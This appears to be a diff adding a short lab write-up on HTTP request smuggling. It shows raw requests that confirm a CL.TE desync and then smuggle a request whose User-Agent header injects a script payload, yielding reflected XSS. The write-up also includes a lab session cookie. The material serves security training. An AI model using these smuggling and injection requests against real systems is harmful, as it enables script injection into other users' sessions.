@@ -1,0 +1,37 @@
+Lab: Exploiting HTTP request smuggling to deliver reflected XSS
+
+Analysis:
+Front-end: CL
+Backend- TE
+
+(1)
+POST / HTTP/1.1
+Host: 0a5500ed047c0d04801e03a800340061.web-security-academy.net
+Cookie: session=FcPh9smjdHcla3CcyFjn8XfqNJt7ZgLw
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+
+3
+abc
+x
+
+-------> Timeout(CL.TE confirmed)
+
+(2)
+POST / HTTP/1.1
+Host: 0a5500ed047c0d04801e03a800340061.web-security-academy.net
+Cookie: session=FcPh9smjdHcla3CcyFjn8XfqNJt7ZgLw
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 149
+Transfer-Encoding: chunked
+
+0
+
+GET /post?postId=7 HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: a"><script>alert(1)</script>
+Content-Length: 5
+
+x=1
+--------------> (executes alert(1))
